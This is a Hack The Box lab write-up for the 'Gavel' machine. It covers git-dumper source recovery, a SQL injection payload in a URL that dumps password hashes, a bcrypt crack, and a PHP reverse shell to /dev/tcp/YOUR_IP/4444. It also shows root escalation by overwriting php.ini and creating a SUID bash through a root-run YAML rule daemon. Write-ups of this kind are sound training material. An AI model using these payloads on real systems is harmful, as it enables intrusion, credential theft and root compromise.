---
title: "Gavel"
date: 2025-10-12
tags: [linux, web, sqli, git-dumper, php, rce, yaml, suid, privesc]
difficulty: medium
platform: HTB
description: "Linux web box — exposed .git repo leaks PHP source revealing a SQLi, admin panel RCE via PHP rule engine, then privesc by abusing a root-run auction daemon that executes YAML-defined PHP rules."
featured: false
---

## Overview

![Gavel](/images/writeups/gavel/logo.png)

| Field | Details |
|---|---|
| **Machine** | Gavel |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Status** | Active |

## TL;DR

- ffuf finds `/.git/` exposed on the web server
- git-dumper reconstructs source → SQL injection in `inventory.php` via `user_id` parameter
- SQLi dumps `auctioneer` bcrypt hash → john cracks it → admin panel access
- PHP reverse shell injected into "edit rule" field → shell as `www-data` → su to `auctioneer`
- Root daemon reads YAML files and executes PHP `rule` field → overwrite `php.ini` to unlock `system()` → SUID bash → root

## Tools Used

- nmap, ffuf, git-dumper, burpsuite, john, netcat, gavel-util

## Setup / Notes

```bash
echo "<ip> gavel.htb" | sudo tee -a /etc/hosts
```

---

## Recon

```bash
nmap -p- -sC -sV gavel.htb
```

![nmap — ports 22 and 80 open](/images/writeups/gavel/nmap.png)

Two ports: 22 (SSH) and 80 (HTTP). All attack surface is on the web app.

---

## Enumeration

Visiting `http://gavel.htb` shows a functional auction platform:

![Gavel auction web app](/images/writeups/gavel/gavelwb1.png)

### Discovering Hidden Endpoints

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u http://gavel.htb/FUZZ -e .php
```

Key finds:
- `/admin.php` — admin dashboard (requires auth)
- `/inventory.php` — user inventory
- `/.git/` — exposed Git repository

### Dumping the Git Repository

```bash
git-dumper http://gavel.htb/.git/ ./gavel-source
```

![git-dumper extracting source](/images/writeups/gavel/git-dumper.png)

We now have the full PHP source. Never deploy `.git/` to production.

### SQL Injection in inventory.php

Reading `inventory.php`:

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";

// vulnerable branch:
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
$stmt->execute([$userId]);
```

`$col` is dynamically injected into the query string before the prepared statement executes. The backtick sanitization only removes backticks — it doesn't prevent injection into the column position. `$userId` is passed as a parameter but the `$col` injection lets us reshape the entire query.

---

## Exploit

### SQLi — Dump Credentials

Register an account, then navigate to `/inventory.php` and inject via the URL:

```
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+CONCAT(username,0x3a,password)+AS+`%27x`+from+users)y;--+-&sort=\?;--+-%00
```

What this does:
- Closes the backtick-wrapped column with `x\``
- Injects a subquery: `SELECT CONCAT(username, ':', password) FROM users`
- Comments out the rest of the original query with `--`

The database executes the subquery and returns credentials in the page:

![SQLi successful — auctioneer hash dumped](/images/writeups/gavel/sqli-succ.png)

The hash is bcrypt (`$2y$` prefix).

### Crack the Hash

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt auctioneer.hash
```

Password cracked. Log in at `http://gavel.htb/admin.php`.

### PHP RCE via Edit Rule

The admin panel has an "edit rule" field that's executed server-side as PHP:

![Admin panel](/images/writeups/gavel/webadmin.png)

![Edit rule field](/images/writeups/gavel/setting.png)

In the edit rule field, paste a reverse shell:

```php
system('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'); return true;
```

The page refreshes every second — paste quickly and click Edit. Set up your listener:

```bash
nc -lvnp 4444
```

Place a bid on the auction where you set the rule. The PHP executes when the bid is processed:

![shell as www-data](/images/writeups/gavel/www%20data.png)

Switch to `auctioneer`:

```bash
su auctioneer  # use the cracked password
```

![user.txt as auctioneer](/images/writeups/gavel/user.png)

---

## Privilege Escalation — YAML Rule Engine

In `/opt/gavel/` there's a `sample.yaml` showing how the auction daemon works:

![sample.yaml](/images/writeups/gavel/sample-yaml.png)

The daemon runs as root and evaluates the `rule` field as PHP. The config at `/opt/gavel/.config/php/php.ini` restricts `system()` via `disable_functions` — but we can overwrite it using the same rule engine.

### Step 1 — Remove PHP Restrictions

Create a YAML that overwrites `php.ini`:

```bash
cat << 'EOF' > fix_ini.yaml
name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisable_functions=\nopen_basedir=\n"); return false;
EOF

/usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.yaml
```

Bid on the "fixini" auction in the web UI to trigger the rule. Verify:

```bash
cat /opt/gavel/.config/php/php.ini
# disable_functions= and open_basedir= should now be empty
```

### Step 2 — Create SUID bash

```bash
cat << 'EOF' > rootshell.yaml
name: rootshell
description: make suid bash
image: "x.png"
price: 1
rule_msg: "rootshell"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
EOF

/usr/local/bin/gavel-util submit /home/auctioneer/rootshell.yaml
```

Bid on the "rootshell" auction. The daemon (running as root) executes `system()` and creates a SUID bash:

```bash
ls -l /opt/gavel/rootbash
# -rwsr-xr-x 1 root root ...
```

```bash
/opt/gavel/rootbash -p
id
# uid=1001(auctioneer) gid=1001(auctioneer) euid=0(root)
```

![root shell via SUID bash](/images/writeups/gavel/root.png)

![root.txt](/images/writeups/gavel/pwned.png)

---

## Lessons Learned

- Never expose `.git/` in production — the entire source history is recoverable with git-dumper
- Dynamic column injection bypasses PDO prepared statements — parameterization only protects values, not identifiers
- "Rule engines" that execute user-controlled strings are RCE primitives; treat them accordingly
- php.ini sandboxing is only effective if the config file itself is unwritable
- SUID copies of `/bin/bash` are a one-step persistent root escalation — audit for them regularly

## References

- [git-dumper](https://github.com/arthaud/git-dumper)
- [SQLi in PDO](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)
- [Linux privilege escalation basics](https://delinea.com/blog/linux-privilege-escalation)
